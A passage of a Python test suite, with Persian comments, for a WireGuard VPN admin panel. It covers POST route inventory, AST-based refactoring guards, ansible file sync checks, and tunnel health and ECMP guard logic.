    # `_code` عمداً استثنا را می‌بلعد، و همین بود که `NameError: sess` در
    # `_post_warp` (از استخراجِ پلنِ ۰۶۳) را پنهان کرد: هر POST به
    # /api/warp/status اتصال را می‌انداخت (ERR_EMPTY_RESPONSE) و تست سبز
    # بود. این‌ها وابستگی‌های زنده را stub می‌کنند و اجازه می‌دهند استثنا
    # بالا بیاید.

    def _post(self, path, body, role="admin"):
        h = make_fake_handler(self.m, path=path, method="POST", body=body,
                              headers={"Cookie": "wgl=en"},
                              session={"u": role, "r": role})
        h.do_POST()
        return (dict(h.sent).get("__code__"),
                json.loads(b"".join(h.body).decode("utf-8") or "{}"))

    def _stub_live(self):
        self.m.warp_status = lambda force=False: {
            "src_labels": {"10.0.0.2": "x"}, "autodetect": {"a": 1},
            "stats": {}}
        self.m.warp_apply = lambda: (True, "applied")
        self.m.warp_targets_read = lambda: ["a.example"]
        self.m.warp_validate_target = lambda raw: ("domain", raw, None)
        self.actors = []
        self.m.warp_targets_write = \
            lambda entries, by: (self.actors.append(by), (True, None))[1]
        self.m.warp_event = lambda kind, detail="", actor="": \
            self.actors.append(actor)

    def test_status_is_still_redacted_for_a_tun_view_role(self):
        self._stub_live()
        code, obj = self._post("/api/warp/status", {}, role="tunview")
        self.assertEqual(code, 200)
        self.assertEqual(obj["warp"]["src_labels"], {})
        self.assertEqual(obj["warp"]["autodetect"], {})

    def test_mutating_branches_record_the_session_user_as_actor(self):
        """preset/target/quic هم `sess["u"]` را می‌خوانند — همان NameError."""
        self._stub_live()
        code, obj = self._post("/api/warp/target/add",
                               {"target": "b.example"})
        self.assertEqual(code, 200)
        self.assertTrue(obj["ok"], obj)
        self.assertEqual(self.actors, ["admin", "admin"])


class PostRouteInventoryTests(unittest.TestCase):
    """فهرستِ مسیرهای POST پین می‌شود (پلنِ ۰۶۳).

    اندازه‌گیریِ ۱۴ اوت ۲۰۲۶: `do_POST` **۱٬۶۷۵ خط** و **۷۶ شاخه**، و در
    شش ماهِ گذشته **۳۸ کامیت** آن زنجیره را لمس کرده‌اند. طبقِ قاعده‌ی
    تصمیمِ خودِ پلن (بیش از ~۶۰ شاخه **یا** ویرایشِ مکرر) بازآرایی ارزشِ
    ریسکش را دارد — ولی پلن به همان اندازه صریح است که گروهِ بدونِ پوششِ
    request-level **جابه‌جا نمی‌شود**، و هارنسِ ۰۱۹ پیش‌گیت و RBAC را
    می‌راند نه رفتارِ تک‌تکِ endpointها.

    پس آنچه این‌جا می‌ماند همان چیزی است که هر مهاجرتِ آینده را
    **اثبات‌پذیر** می‌کند: مجموعه‌ی مسیرها پین می‌شود، پس اگر بازآرایی
    مسیری را گم کند تنها نشانه‌اش دیگر ۴۰۴ ِ بی‌صدا روی endpointای که
    قبلاً کار می‌کرد نیست — همین تست قرمز می‌شود.

    افزودنِ endpointِ تازه هم عمداً این را قرمز می‌کند: یک خط به فهرست
    اضافه کن، و همان لحظه یادت می‌افتد که PERM_MAP هم می‌خواهد.
    """

    POST_PATHS = frozenset({
        "/api/alerts/get", "/api/alerts/save", "/api/alerts/test",
        "/api/backup/cloud-restore", "/api/backup/run",
        "/api/backup/versions", "/api/bot/get", "/api/bot/save",
        "/api/ecmp/get", "/api/ecmp/save", "/api/graph/events",
        "/api/login", "/api/logout", "/api/net/leak-audit", "/api/password",
        "/api/peer/add", "/api/peer/bulk", "/api/peer/conf",
        "/api/peer/delete", "/api/peer/ips", "/api/peer/meta",
        "/api/peer/psk", "/api/peer/rotate", "/api/peer/share",
        "/api/peer/toggle", "/api/proxy/add", "/api/proxy/clients",
        "/api/proxy/config", "/api/proxy/delete", "/api/proxy/dests",
        "/api/proxy/edit", "/api/proxy/list", "/api/proxy/log",
        "/api/proxy/series", "/api/report/config", "/api/report/test",
        "/api/restore", "/api/roles/delete", "/api/roles/list",
        "/api/roles/save", "/api/settings/allowlist",
        "/api/speedtest/cancel", "/api/speedtest/config",
        "/api/speedtest/run", "/api/svc/add", "/api/svc/delete",
        "/api/svc/ip/delete", "/api/svc/ip/edit", "/api/svc/iplist",
        "/api/svc/mtr", "/api/svc/mtr/history", "/api/svc/probe",
        "/api/sys/series", "/api/totp/confirm", "/api/totp/disable",
        "/api/totp/setup", "/api/tunnel/toggle", "/api/usage",
        "/api/usage_matrix", "/api/users/add", "/api/users/delete",
        "/api/users/edit", "/api/users/list", "/api/users/reset",
        "/api/warp/endpoints/rank", "/api/warp/events", "/api/warp/latency",
        "/api/warp/preset/toggle", "/api/warp/presets", "/api/warp/quic",
        "/api/warp/split-series", "/api/warp/status",
        "/api/warp/target/add", "/api/warp/target/del", "/api/warp/targets",
        "/api/warp/test",
    })

    def _scanned(self):
        """(مجموعه‌ی مسیرها، نامِ متدهایی که پویش شدند).

        از پلنِ ۰۶۳ به بعد `do_POST` تنها جای شاخه‌ها نیست: گروه‌ها به
        متدهای `_post_*` استخراج می‌شوند. پویش باید هر دو را ببیند،
        وگرنه **همین گارد** استخراج را با «مسیر گم شد» اشتباه می‌گیرد —
        که دقیقاً یک بار رخ داد.
        """
        import ast, re
        src = _read_panel_source()
        tree = ast.parse(src)
        lines = src.splitlines()
        paths, scanned = set(), []
        for n in ast.walk(tree):
            if not isinstance(n, ast.FunctionDef):
                continue
            # do_POST فقط پوششِ try/except است (پلنِ ۵۰۰ ِ JSON); شاخه‌ها در
            # _do_post زندگی می‌کنند.
            if not (n.name in ("do_POST", "_do_post")
                    or n.name.startswith("_post_")):
                continue
            scanned.append(n.name)
            for l in lines[n.lineno - 1:n.end_lineno]:
                m = re.match(r'\s*(el)?if path == ["\']([^"\']+)', l)
                if m:
                    paths.add(m.group(2))
        return paths, sorted(scanned)

    def _paths(self):
        return self._scanned()[0]

    def test_no_extracted_group_returns_a_bare_return(self):
        """`return` ِ خام در متدِ گروه یعنی «رسیدگی نشد» — و پاسخِ دوم.

        در زنجیره‌ی اصلی، `return` وسطِ یک شاخه یعنی «کارم تمام شد».
        وقتی همان شاخه به متدِ گروه منتقل می‌شود، آن `return` مقدارِ
        `None` برمی‌گرداند — یعنی falsy — پس `do_POST` زنجیره را ادامه
        می‌دهد و در انتها **۴۰۴ ِ دومی** روی همان اتصال می‌نویسد. پاسخ
        JSON ِ نامعتبر می‌شود و هیچ استثنایی هم بالا نمی‌آید.

        این دقیقاً حینِ اجرای پلنِ ۰۶۳ رخ داد: ۱۸ موردِ `return` ِ خام در
        `_post_proxy`. تستِ رفتاریِ گروه گرفتش (`Extra data` در
        `json.loads`)، ولی گاردِ ساختاری ارزان‌تر است و به فیکسچر نیاز
        ندارد.
        """
        import ast
        src = _read_panel_source()
        lines = src.splitlines()
        bad = []
        for n in ast.walk(ast.parse(src)):
            if not (isinstance(n, ast.FunctionDef)
                    and n.name.startswith("_post_")):
                continue
            for i in range(n.lineno - 1, n.end_lineno):
                if lines[i].strip() == "return":
                    bad.append("%s:%d" % (n.name, i + 1))
        self.assertEqual(bad, [],
                         "return ِ خام در متدِ گروه (باید True باشد): %s" % bad)

    def test_every_extracted_group_ends_with_the_fallthrough_contract(self):
        """قراردادِ گروه: `else: return False` و `return True` ِ پایانی.

        بدونِ `return False` مسیرِ ناشناخته «رسیدگی‌شده» شمرده می‌شود و
        زنجیره هرگز به ۴۰۴ نمی‌رسد — یعنی معناشناسیِ مسیرِ نگاشت‌نشده
        بی‌صدا عوض می‌شود، همان چیزی که پلن گفت باید عمدی باشد نه عارضه.
        """
        import ast
        src = _read_panel_source()
        lines = src.splitlines()
        for n in ast.walk(ast.parse(src)):
            if not (isinstance(n, ast.FunctionDef)
                    and n.name.startswith("_post_")):
                continue
            tail = [l.strip() for l in lines[n.lineno - 1:n.end_lineno]
                    if l.strip()][-3:]
            with self.subTest(fn=n.name):
                self.assertEqual(tail, ["else:", "return False", "return True"],
                                 "%s قراردادِ عبور را ندارد" % n.name)

    def test_no_extracted_group_reads_an_unbound_name(self):
        """متدِ گروه نباید نامی بخواند که نه محلی است، نه سراسری، نه builtin.

        استخراج از `do_POST` محلی‌هایش (`sess`، `me`، ...) را با خود
        نمی‌آورد، و پایتون این را فقط در زمانِ اجرا می‌گیرد — `NameError`
        وسطِ درخواست، یعنی اتصالِ افتاده. دقیقاً همین برای `sess` در
        `_post_warp` رخ داد و تستِ رفتاری (که استثنا را می‌بلعد) ندید.
        """
        import ast, builtins
        tmp = tempfile.mkdtemp(prefix="wgpanel-names-")
        self.addCleanup(shutil.rmtree, tmp, True)
        m = load_module(tmp)
        src = _read_panel_source()
        bad = []
        for n in ast.walk(ast.parse(src)):
            if not (isinstance(n, ast.FunctionDef)
                    and n.name.startswith("_post_")):
                continue
            bound = {a.arg for a in ast.walk(n) if isinstance(a, ast.arg)}
            for x in ast.walk(n):
                if isinstance(x, ast.Name) and isinstance(x.ctx, ast.Store):
                    bound.add(x.id)
                elif isinstance(x, ast.ExceptHandler) and x.name:
                    bound.add(x.name)
                elif isinstance(x, (ast.Import, ast.ImportFrom)):
                    bound.update((a.asname or a.name).split(".")[0]
                                 for a in x.names)
                elif isinstance(x, (ast.FunctionDef, ast.ClassDef)) \
                        and x is not n:
                    bound.add(x.name)
            for x in ast.walk(n):
                if (isinstance(x, ast.Name) and isinstance(x.ctx, ast.Load)
                        and x.id not in bound and not hasattr(m, x.id)
                        and not hasattr(builtins, x.id)):
                    bad.append("%s:%d %s" % (n.name, x.lineno, x.id))
        self.assertEqual(bad, [], "نامِ بی‌مقدار در متدِ گروه: %s" % bad)

    def test_the_scan_covers_do_post_and_every_extracted_group(self):
        """گاردِ خودِ گارد: اگر پویش متدی را جا بیندازد بی‌صدا سست می‌شود."""
        _paths, scanned = self._scanned()
        self.assertIn("_do_post", scanned)
        groups = [n for n in scanned if n.startswith("_post_")]
        self.assertGreaterEqual(len(groups), 1,
                                "هیچ گروهِ استخراج‌شده‌ای پیدا نشد — "
                                "الگوی نام‌گذاری عوض شده؟")

    def test_the_post_path_set_is_unchanged(self):
        got = self._paths()
        self.assertEqual(got - self.POST_PATHS, set(), "مسیرِ POST ِ ثبت‌نشده")
        self.assertEqual(self.POST_PATHS - got, set(), "مسیرِ POST گم شده")

    def test_every_post_path_is_under_the_permission_map(self):
        """هر مسیر یا در PERM_MAP است یا به پیش‌فرضِ admin-only می‌افتد.

        امروز مسیرِ نگاشت‌نشده admin-only است (تستِ ۰۱۹ همین را می‌سنجد).
        اگر روزی جدولِ مسیر جای زنجیره را بگیرد، «نگاشت‌نشده» یعنی ۴۰۴ —
        و آن **تغییرِ معناییِ واقعی** است که باید عمدی و مستند باشد، نه
        عارضه‌ی جانبیِ بازآرایی. این تست فهرست را در دسترس نگه می‌دارد.
        """
        src = _read_panel_source()
        mapped = set(re.findall(r'^\s*"(/api/[^"]+)":', src, re.M))
        unmapped = sorted(p for p in self.POST_PATHS
                          if p.startswith("/api/") and p not in mapped)
        # عدد از اندازه‌گیری می‌آید، نه از حدس: این‌ها عمداً یا پیش از گیت
        # پردازش می‌شوند (login/password/logout/restore) یا به پیش‌فرضِ
        # admin-only می‌افتند.
        self.assertLessEqual(len(unmapped), 40,
                             "مسیرهای نگاشت‌نشده ناگهان زیاد شدند: %s"
                             % unmapped)


class RegionAnchorTests(unittest.TestCase):
    """نقشه‌ی ناحیه‌های `wg_panel.py` باید کلِ فایل را بپوشاند (پلنِ ۰۵۷).

    `CLAUDE.md` می‌گوید فایل را کامل نخوان و با grep به لنگرِ ناحیه برو.
    برای ۸٬۴۴۵ خطِ **اول** این ممکن نبود: هیچ لنگری نداشت — و همان‌جا
    کاتالوگِ i18n، `load_config`، ممیزی و پارسِ ورودیِ کاربر است. یعنی
    دستورالعملِ ناوبریِ مخزن برای ۲۷٪ فایل مقصدی نداشت.
    """

    #: ناحیه‌هایی که **عمداً** یکپارچه‌اند و کرانِ زیر شاملشان نیست.
    #: هر دو داده‌اند نه کد، و شکستنشان ممکن یا بی‌معناست:
    #:   کاتالوگ  — یک دیکشنریِ واحد؛ لنگرِ میانی وسطِ literal می‌افتد
    #:   HTML/JS  — رشته‌ی خام است؛ «# ---» داخلش به صفحه‌ی کاربر می‌رسد
    EXEMPT = ("کاتالوگِ ترجمه", "HTML/JS")

    #: از اندازه‌گیریِ واقعیِ ۱۴ اوت ۲۰۲۶، نه از حدس: بزرگ‌ترین ناحیه‌ی
    #: **کدِ** باقی‌مانده «رباتِ تلگرام» با ۲٬۷۸۱ خط است. آستانه کمی بالاتر
    #: گذاشته شده تا رشدِ عادی قرمز نکند ولی ناحیه‌ی بی‌نامِ تازه بگیرد.
    MAX_GAP = 3000

    def _anchors(self):
        src = _read_panel_source()
        lines = src.splitlines()
        out = []
        for i, l in enumerate(lines, 1):
            m = re.match(r"^# -{10,}\s*(.*)$", l)
            if m:
                out.append((i, m.group(1).strip()))
        return out, len(lines)

    def test_every_anchor_has_a_name(self):
        """لنگرِ بی‌نام لنگری است که نمی‌شود به آن grep زد.

        دو تا داشتیم (حسابداریِ per-block و SvcDiag): خطِ خط‌تیره و شرحش
        روی خطِ بعد. `grep '^# -\\{10,\\}'` فهرستِ ناقص می‌داد.
        """
        anchors, _ = self._anchors()
        self.assertTrue(anchors, "هیچ لنگرِ ناحیه‌ای نیست")
        nameless = [ln for ln, name in anchors if not name]
        self.assertEqual(nameless, [], "لنگرِ بی‌نام در خطوط: %s" % nameless)

    def test_no_large_region_is_left_unanchored(self):
        anchors, total = self._anchors()
        gaps, prev, prev_name = [], 1, "«سرِ فایل»"
        for ln, name in anchors + [(total, "«پایانِ فایل»")]:
            if (ln - prev > self.MAX_GAP
                    and not any(e in prev_name for e in self.EXEMPT)):
                gaps.append((prev_name, prev, ln, ln - prev))
            prev, prev_name = ln, name
        self.assertEqual(gaps, [], "ناحیه‌ی بی‌لنگر: %s" % gaps)

    def test_the_exemptions_still_exist(self):
        """اگر ناحیه‌ی معاف تغییرِ نام بدهد، معافیت بی‌صدا کلِ گارد را
        سست می‌کند — پس خودِ معافیت هم پین می‌شود."""
        names = [n for _ln, n in self._anchors()[0]]
        for e in self.EXEMPT:
            self.assertTrue(any(e in n for n in names),
                            "ناحیه‌ی معافِ «%s» دیگر وجود ندارد" % e)


class AnsibleSyncTests(unittest.TestCase):
    """پوشه‌ی ansible خودکفاست (roles/wg-panel/files/)؛ این تست تضمین می‌کند
    کپی‌های داخلِ نقش با سورسِ اصلیِ مخزن بایت‌به‌بایت یکسان بمانند.

    در نسخه‌ی منتشرشده‌ی مخزن (شاخه‌ی public) پوشه‌ی ansible/ وجود ندارد —
    بسته‌های نصب هنوز عمومی‌سازی نشده‌اند. آنجا کلِ کلاس skip می‌شود، چون
    چیزی برای هم‌گام نگه‌داشتن نیست. اینجا هرگز skip نمی‌شود.
    """

    @classmethod
    def setUpClass(cls):
        if not os.path.isdir(os.path.join(HERE, "..", "ansible")):
            raise unittest.SkipTest("پوشه‌ی ansible/ نیست — مخزنِ عمومی")

    PAIRS = [
        ("wg_panel.py", "wg_panel.py"),
        ("wg-panel.service", "wg-panel.service"),
        ("deploy/fail2ban-wg-panel.filter.conf", "fail2ban-wg-panel.filter.conf"),
        ("deploy/fail2ban-wg-panel.jail.conf", "fail2ban-wg-panel.jail.conf"),
        ("deploy/wg-panel-backup.sh", "wg-panel-backup.sh"),
        ("deploy/wg-panel-verify-backup.sh", "wg-panel-verify-backup.sh"),
        ("deploy/wg-panel-backup.service", "wg-panel-backup.service"),
        ("deploy/wg-panel-backup.timer", "wg-panel-backup.timer"),
        ("deploy/wg-panel-verify-backup.service", "wg-panel-verify-backup.service"),
        ("deploy/wg-panel-verify-backup.timer", "wg-panel-verify-backup.timer"),
        ("deploy/wg-panel-s4-upload.sh", "wg-panel-s4-upload.sh"),
        ("deploy/wg-panel-s4-upload.service", "wg-panel-s4-upload.service"),
        ("deploy/wg-panel-s4-upload.timer", "wg-panel-s4-upload.timer"),
        ("three.module.min.js.gz", "three.module.min.js.gz"),
        ("three.core.min.js.gz", "three.core.min.js.gz"),
        ("three.LICENSE.txt", "three.LICENSE.txt"),
        ("qr.js", "qr.js"),
        # drop-inهای systemd که نقش نصبشان می‌کند (نامِ تخت در مخزن)
        ("deploy/wg-panel-oom.conf", "wg-panel-oom.conf"),
        ("deploy/wg-panel-proxy.conf", "wg-panel-proxy.conf"),
        ("deploy/wg-quick-oom.conf", "wg-quick-oom.conf"),
        # زنجیره‌ی WARP — بدونِ این‌ها بازسازی از ansible کلِ مسیرِ AI را
        # بی‌صدا جا می‌گذارد (نه گاردی خراب می‌شود، نه خطایی چاپ)
        ("deploy/warp-sni-splitter.py", "warp-sni-splitter.py"),
        ("deploy/warp-sni-splitter.service", "warp-sni-splitter.service"),
        ("deploy/warp-gemini-sync.sh", "warp-gemini-sync.sh"),
        ("deploy/warp-gemini-teardown.sh", "warp-gemini-teardown.sh"),
        ("deploy/warp-gemini.service", "warp-gemini.service"),
        ("deploy/warp-gemini-refresh.service", "warp-gemini-refresh.service"),
        ("deploy/warp-gemini.timer", "warp-gemini.timer"),
        ("deploy/warp-gemini-README.txt", "warp-gemini-README.txt"),
        ("deploy/warp-autodetect.py", "warp-autodetect.py"),
        ("deploy/warp-autodetect.service", "warp-autodetect.service"),
        ("deploy/warp-autodetect.timer", "warp-autodetect.timer"),
        ("deploy/warp-standby-setup.sh", "warp-standby-setup.sh"),
        # ماشین‌آلاتِ تونلِ مادر و ECMP — awg-ecmp-from-file.sh را PostUp ِ
        # خودِ کانفیگِ awg صدا می‌زند، پس نبودنش «awg-quick up» را می‌شکند
        ("deploy/awg-quick@.service", "awg-quick@.service"),
        ("deploy/awg-quick-awg3-adopt.conf", "awg-quick-awg3-adopt.conf"),
        ("deploy/awg-ecmp-from-file.sh", "awg-ecmp-from-file.sh"),
        ("deploy/ecmp-guard.sh", "ecmp-guard.sh"),
        ("deploy/ecmp-guard.service", "ecmp-guard.service"),
        ("deploy/ecmp-guard.timer", "ecmp-guard.timer"),
        # نگهبان‌های ناظر — نبودنشان هیچ نشانه‌ای ندارد جز سکوت
        ("deploy/tunnel-guard.sh", "tunnel-guard.sh"),
        ("deploy/tunnel-guard-notify.sh", "tunnel-guard-notify.sh"),
        ("deploy/tunnel-guard.service", "tunnel-guard.service"),
        ("deploy/tunnel-guard.timer", "tunnel-guard.timer"),
        ("deploy/endpoint-route-check.sh", "endpoint-route-check.sh"),
        ("deploy/endpoint-route-check.service", "endpoint-route-check.service"),
        ("deploy/endpoint-route-check.timer", "endpoint-route-check.timer"),
        # ماژولِ QUIC ِ همراهِ splitter — splitter از کنارِ خودش importش
        # می‌کند و نبودش QUIC را بی‌صدا خاموش می‌کند (نه خطایی، نه لاگی)
        ("deploy/quic_sni.py", "quic_sni.py"),
        # بکاپِ کاملِ سرور — همان چیزی که «بازسازی» را ممکن می‌کند
        ("deploy/myserver-full-backup.sh", "myserver-full-backup.sh"),
        ("deploy/myserver-full-backup.service", "myserver-full-backup.service"),
        ("deploy/myserver-full-backup.timer", "myserver-full-backup.timer"),
    ]

    def test_ansible_files_match_source(self):
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        files_dir = os.path.join(root, "ansible", "roles", "wg-panel", "files")
        for src_rel, dst_name in self.PAIRS:
            src = os.path.join(root, src_rel)
            dst = os.path.join(files_dir, dst_name)
            self.assertTrue(os.path.exists(dst),
                            "%s نیست — ansible/sync-files.sh را اجرا کنید" % dst_name)
            with open(src, "rb") as f1, open(dst, "rb") as f2:
                self.assertEqual(
                    hashlib.sha256(f1.read()).hexdigest(),
                    hashlib.sha256(f2.read()).hexdigest(),
                    "ناهمگام: %s ≠ ansible files/%s — ansible/sync-files.sh "
                    "را اجرا کنید" % (src_rel, dst_name))

    def test_ansible_version_stamp(self):
        """VERSION داخلِ نقش باید ۱۲ رقمِ اولِ SHA-256 خودِ wg_panel.py باشد."""
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        vpath = os.path.join(root, "ansible", "roles", "wg-panel", "files",
                             "VERSION")
        self.assertTrue(os.path.exists(vpath),
                        "VERSION نیست — ansible/sync-files.sh را اجرا کنید")
        with open(os.path.join(root, "wg_panel.py"), "rb") as f:
            want = hashlib.sha256(f.read()).hexdigest()[:12]
        with open(vpath, encoding="utf-8") as f:
            got = f.read().strip()
        self.assertEqual(got, want,
                         "VERSION کهنه است — ansible/sync-files.sh را اجرا کنید")

    # ——— گاردهای پوشش ———
    # شکافِ ۳۰ ژوئیه ۲۰۲۶ (هیچ یونیتِ warp-* در نقش نبود) از دیدِ تست‌ها
    # نامرئی بود، چون AnsibleSyncTests فقط چیزی را می‌سنجید که *قبلاً* در
    # PAIRS ثبت شده بود. این سه تست همان نقطه‌ی کور را می‌بندند: هر سه ضلعِ
    # sync-files.sh / files/ / tasks/main.yml باید یکدیگر را پوشش بدهند.

    @staticmethod
    def _synced_names(root):
        """نامِ فایل‌هایی که sync-files.sh واقعاً در files/ می‌ریزد."""
        path = os.path.join(root, "ansible", "sync-files.sh")
        with open(path, encoding="utf-8") as f:
            body = f.read()
        return set(re.findall(r'"\$DEST/([^"]+)"', body))

    def test_sync_script_and_pairs_agree(self):
        """هر چیزی که sync-files.sh کپی می‌کند باید در PAIRS هم باشد."""
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        synced = self._synced_names(root) - {"VERSION"}
        declared = {dst for _, dst in self.PAIRS}
        self.assertEqual(
            synced - declared, set(),
            "sync-files.sh این‌ها را کپی می‌کند ولی PAIRS نمی‌سنجدشان — "
            "بی‌صدا کهنه می‌شوند")
        self.assertEqual(
            declared - synced, set(),
            "PAIRS این‌ها را می‌سنجد ولی sync-files.sh کپی‌شان نمی‌کند")

    def test_no_orphan_files_in_role(self):
        """فایلی در نقش نماند که هیچ منبعی در مخزن نداشته باشد."""
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        files_dir = os.path.join(root, "ansible", "roles", "wg-panel", "files")
        on_disk = {n for n in os.listdir(files_dir) if not n.startswith(".")}
        known = {dst for _, dst in self.PAIRS} | {"VERSION"}
        self.assertEqual(
            on_disk - known, set(),
            "فایلِ یتیم در roles/wg-panel/files/ — یا به PAIRS اضافه‌اش کنید "
            "یا حذفش کنید (نقش آن را نصب می‌کند ولی هیچ‌کس همگامش نمی‌کند)")

    def test_task_src_files_exist(self):
        """هر src: در tasks/main.yml باید فایلی باشد که واقعاً همگام می‌شود."""
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        role = os.path.join(root, "ansible", "roles", "wg-panel")
        tasks = os.path.join(role, "tasks", "main.yml")
        with open(tasks, encoding="utf-8") as f:
            body = f.read()
        # templates/ منبعِ دیگری است (ansible.builtin.template) و از
        # sync-files.sh نمی‌آید، پس جزوِ «شناخته» حساب می‌شود.
        templates = set(os.listdir(os.path.join(role, "templates")))
        known = {dst for _, dst in self.PAIRS} | {"VERSION"} | templates
        # src: هایی که مقدارشان ثابت است (نه Jinja) — loopها با {f: ...}
        # هم گرفته می‌شوند تا فایل‌های حلقه از قلم نیفتند.
        refs = set(re.findall(r'^\s*src:\s*([A-Za-z0-9._@-]+)\s*$',
                              body, re.M))
        refs |= set(re.findall(r'\{f:\s*([A-Za-z0-9._@-]+),', body))
        # عضوهای تختِ loop (مثلِ «- ecmp-guard.timer»). تا ۳۰ ژوئیه ۲۰۲۶ این
        # الگو فقط «warp-*» را می‌گرفت، یعنی خودِ گارد یک نقطه‌ی کور داشت:
        # هر خانواده‌ی تازه‌ای بیرونِ آن پیشوند بی‌سنجش می‌ماند. حالا به‌جای
        # پیشوندِ نام، به *پسوندِ فایل* لنگر می‌اندازد — پس عضوهای loop که
        # نامِ بسته یا سرویسِ سیستم‌اند (python3، fail2ban) گرفته نمی‌شوند.
        refs |= set(re.findall(
            r'^\s*-\s+([A-Za-z0-9._@-]+\.(?:service|timer|sh|py|conf|txt))'
            r'\s*(?:#.*)?$', body, re.M))
        missing = refs - known
        self.assertEqual(
            missing, set(),
            "tasks/main.yml این فایل‌ها را نصب می‌کند ولی sync-files.sh "
            "نمی‌سازدشان ⇒ نقش موقعِ اجرا می‌شکند: %s" % sorted(missing))


class TunnelHealthTests(unittest.TestCase):
    """داده‌های غنیِ تونل: نوع/یونیت، سلامتِ صادقانه، آشکارسازِ حلقه، enable."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_tunnel_unit_and_type(self):
        m = self.m
        self.assertEqual(m.tunnel_unit("wg21"), "wg-quick@wg21")
        self.assertEqual(m.tunnel_unit("awg1"), "awg-quick@awg1")
        self.assertTrue(m._tunnel_is_awg("awg1"))
        self.assertFalse(m._tunnel_is_awg("wg21"))

    def test_tunnel_health_states(self):
        m = self.m
        now = m.time.time()
        # حلقه‌ی مسیریابی بر همه‌چیز اولویت دارد
        self.assertEqual(m.tunnel_health({"loop": True, "active": True}), "loop")
        # خاموش
        self.assertEqual(m.tunnel_health({"active": False}), "off")
        # بالا ولی بدونِ هندشیک → مرده
        self.assertEqual(m.tunnel_health(
            {"active": True, "handshake": 0}), "dead")
        # هندشیکِ کهنه → مرده
        self.assertEqual(m.tunnel_health(
            {"active": True, "handshake": now - 999}), "dead")
        # هندشیکِ تازه ولی ۰ دریافت → بی‌بازگشت
        self.assertEqual(m.tunnel_health(
            {"active": True, "handshake": now - 5, "rx": 0}), "noreturn")
        # هندشیکِ تازه، دریافت هست، ولی نرخ صفر → idle
        self.assertEqual(m.tunnel_health(
            {"active": True, "handshake": now - 5, "rx": 100,
             "rx_rate": 0, "tx_rate": 0}), "idle")
        # سالمِ کامل
        self.assertEqual(m.tunnel_health(
            {"active": True, "handshake": now - 5, "rx": 100,
             "rx_rate": 50, "tx_rate": 10}), "healthy")

    def test_endpoint_route_loop_detection(self):
        m = self.m
        # مسیرِ endpoint از داخلِ یک تونل → حلقه
        m.run = lambda cmd, timeout=20: (
            0, "1.2.3.4 dev awg1 src 10.0.0.1 uid 0 \n    cache", "")
        dev, loop = m.endpoint_route_check("1.2.3.4:41641")
        self.assertEqual(dev, "awg1")
        self.assertTrue(loop)
        # مسیرِ سالم از eth0 → بدونِ حلقه
        m.run = lambda cmd, timeout=20: (
            0, "1.2.3.4 via %s dev eth0 src %s" % (SRV_GW, SRV_IP), "")
        dev, loop = m.endpoint_route_check("1.2.3.4:41641")
        self.assertEqual(dev, "eth0")
        self.assertFalse(loop)
        # هاست‌نیم (نه IP) → قضاوت نمی‌کنیم
        self.assertEqual(m.endpoint_route_check("tr.example.com:10001"),
                         (None, False))
        self.assertEqual(m.endpoint_route_check(""), (None, False))

    def test_list_awg_confs_filters(self):
        m = self.m
        d = os.path.join(self.tmp, "awgdir")
        os.makedirs(d)
        for fn in ("awg1.conf", "awg2.conf", "awg2.failed1.conf",
                   "awg1.conf.self", "reserved.conf", "wg6.conf.bak"):
            open(os.path.join(d, fn), "w").close()
        m.AWG_DIR = d
        self.assertEqual(m.list_awg_confs(), ["awg1", "awg2"])

    def test_tunnel_enabled_symlink(self):
        m = self.m
        wants = os.path.join(self.tmp, "wants")
        os.makedirs(wants)
        m.SYSTEMD_WANTS_DIR = wants
        self.assertFalse(m.tunnel_enabled("wg21"))       # لینک نیست → disabled
        open(os.path.join(wants, "wg-quick@wg21.service"), "w").close()
        self.assertTrue(m.tunnel_enabled("wg21"))        # حالا enabled
        # awg از یونیتِ awg-quick استفاده می‌کند
        self.assertFalse(m.tunnel_enabled("awg1"))
        open(os.path.join(wants, "awg-quick@awg1.service"), "w").close()
        self.assertTrue(m.tunnel_enabled("awg1"))


class EcmpGuardTests(unittest.TestCase):
    """ترمیمِ ECMP در بازهٔ گذار: منطقِ سلامت + ماشینِ حالتِ edge-triggered."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        # probeِ لایه‌ی داده در محیطِ تست شبکه‌ای ندارد؛ پیش‌فرضِ «سالم» تا
        # آزمون‌ها منطقِ خودشان را بسنجند و فراخوانِ pingِ آن در آزمون‌هایی که
        # فراخوان‌های run را می‌شمارند نویز نسازد.
        self.m.tunnel_data_plane_ok = lambda *a, **k: True

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _set_peers(self, peers):
        self.m.SAMPLER.snapshot = lambda: {"peers": peers}

    def test_ecmp_tunnel_state(self):
        m = self.m
        m.live_interfaces = lambda: ["wg21"]          # فقط wg21 بالاست
        # probeِ لایه‌ی داده در تست شبکه ندارد؛ پیش‌فرض «سالم» تا این آزمون
        # همان چیزی را بسنجد که برایش نوشته شده (منطقِ hs/rx). سناریوی
        # شکستِ probe در test_ecmp_zombie_tunnel_detected جدا آزموده می‌شود.
        m.tunnel_data_plane_ok = lambda *a, **k: True
        now = m.time.time()
        # بالا + هندشیکِ تازه → healthy
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5)}])
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "healthy")
        # بالا + هندشیکِ کهنه ولی زیر آستانه (۱۰۰ < ۱۵۰) → healthy (رفعِ false-positive)
        self._set_peers([{"iface": "wg21", "handshake": int(now - 100),
                          "rx_rate": 0}])
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "healthy")
        # بالا + هندشیکِ خیلی کهنه ولی در حالِ دریافت (rx حرکت دارد) → healthy
        self._set_peers([{"iface": "wg21", "handshake": int(now - 300),
                          "rx_rate": 5000}])
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "healthy")
        # بالا + هندشیکِ خیلی کهنه + هیچ دریافتی → dead (بازهٔ گذارِ واقعی)
        self._set_peers([{"iface": "wg21", "handshake": int(now - 300),
                          "rx_rate": 0}])
